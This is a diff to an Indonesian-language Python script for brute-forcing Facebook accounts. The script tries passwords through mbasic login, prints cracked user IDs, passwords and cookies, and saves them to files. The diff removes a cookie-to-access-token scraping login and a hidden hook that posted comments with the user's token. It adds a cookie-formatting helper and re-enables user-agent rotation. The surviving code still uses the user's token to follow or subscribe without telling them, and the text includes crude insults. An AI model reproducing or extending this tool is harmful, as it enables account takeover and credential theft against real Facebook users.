@@ -1,10 +1,5 @@
-import requests,bs4,json,os,sys,random,datetime,time,re,urllib3,rich,base64,subprocess,uuid,calendar
+import requests,bs4,json,os,sys,random,datetime,time,re,calendar
 #------------------[  MODULE  ]-------------------#
-try:
-    import licensing
-except ImportError:
-    print('• Sedang Menginstall Modul licensing •')
-    os.system('pip install licensing')
 try:
         import rich
 except ImportError:
@@ -27,28 +22,17 @@ from rich import pretty
 from rich.tree import Tree
 from rich.panel import Panel
 from rich import print as cetak
-from rich import print as rprint
 from rich import print as prints
 from rich.progress import track
-from rich.text import Text as tekz
 from rich.console import Console
-from rich.text import Text
 from rich.columns import Columns
 from rich.panel import Panel as nel
 from rich.panel import Panel as panel
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup as par
-from rich.console import Group as gp
 from bs4 import BeautifulSoup as parser
-from rich.columns import Columns as col
 from rich.console import Console as sol
-from bs4 import BeautifulSoup as beautifulsoup
 from rich.markdown import Markdown as mark
 from concurrent.futures import ThreadPoolExecutor as tred
-from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
-from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
-from licensing.models import *
-from licensing.methods import Key, Helpers
+from rich.progress import Progress,TextColumn
 
 #------------------[ GLOBAL NAME ]-------------------#
 sekarang = calendar.timegm(time.gmtime(time.time()))
@@ -341,14 +325,12 @@ def banner():
 def login123():
 	os.system('clear')
 	banner()
-	Console().print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie EAAT (Recomend)\n[bold white][[bold cyan]02[bold white]] Login Menggunakan Cookie EAAB (not recomend)\n[[bold cyan]03[bold white]] Keluar
+	Console().print(Panel("""[bold white][[bold cyan]01[bold white]] Login Menggunakan Cookie EAAT (Recomend)\n[[bold cyan]02[bold white]] Keluar
     """,width=80, style=f"{color_panel}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (LOGIN) [bold green]<[bold yellow]<[bold red]<"))
 	bryn = console.input(f" {H2}• {P2}pilih menu : ")
 	if bryn in ['1','01']:
 		login_lagi334()
 	elif bryn in ['2','02']:
-		login_lagi335()
-	elif bryn in ['3','03']:
 		exit()
 	else:
 		Console().print("[bold cyan]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r')
@@ -435,31 +417,7 @@ def login_lagi334():
                 time.sleep(3)
                 exit()
     except:pass
-
-def login_lagi335():
-	try:
-		os.system('clear')
-		banner() 
-		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'\n{x}[{h}+{x}] Masukkan Cookies :{asu} ')
-		cookies = {'cookie':cookie}
-		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
-		req = ses.get(url,cookies=cookies)
-		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
-		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
-		roq = ses.get(nek,cookies=cookies)
-		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
-		ken = open(".token.txt", "w").write(tok)
-		cok = open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}√{x}]{h} LOGIN BERHASIL KONTOL.........Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
-		exit()
-	except Exception as e:
-		os.system("rm -f .token.txt")
-		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
-
-
-
+    
 def followdong():
 	try:
 		token = open('.token.txt','r').read()
@@ -481,12 +439,6 @@ def menu(my_name,my_id):
     try:
         token = open('.token.txt','r').read()
         cookie = open('.cok.txt','r').read()
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom1}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom2}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom3}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom4}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom5}&access_token={token}", headers = {"cookie":cookie}) 
-        requests.post(f"https://graph.facebook.com/888863122574933/comments/?message={kom6}&access_token={token}", headers = {"cookie":cookie}) 
         requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tokenku))
     except IOError:
         Console().print("[bold cyan] ─>[bold red] Cookies Kadaluarsa ")
@@ -932,7 +884,11 @@ def massal():
 		time.sleep(3)
 		exit()
   
-  
+def convert(cookie):
+    cok = ('fr=%s;datr=%s;c_user=%s;xs=%s'%(cookie['fr'],cookie['datr'],cookie['c_user'],cookie['xs']))
+    return(str(cok))
+
+
 def cektahun(fx):
     if len(fx)==15:
         if fx[:10] in ['1000000000']       :tahunz = '2009'
@@ -1223,7 +1179,7 @@ def crackmbasic(idf,pwv,awal):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(free) 
-	#ua2 = random.choice(ugen2)
+	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	ahir = str(datetime.now()-awal).split('.')[0]
 	prog.update(des,description=f'\r[bold white]Mbasic [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
@@ -1250,7 +1206,6 @@ def crackmbasic(idf,pwv,awal):
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
 				print(f'\r{U}[{P}☕{U}] {P}USER   : {h}{idf} {P}<=>{tahun(idf)}\n\r{U}[{P}☕{U}] {P}PASS   : {h}{pw}\n\r{U}[{P}☕{U}] {P}COKI   : {u}{kuki}\n') 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
-				#cek_apk(session,coki)
 				break
 				
 			else:
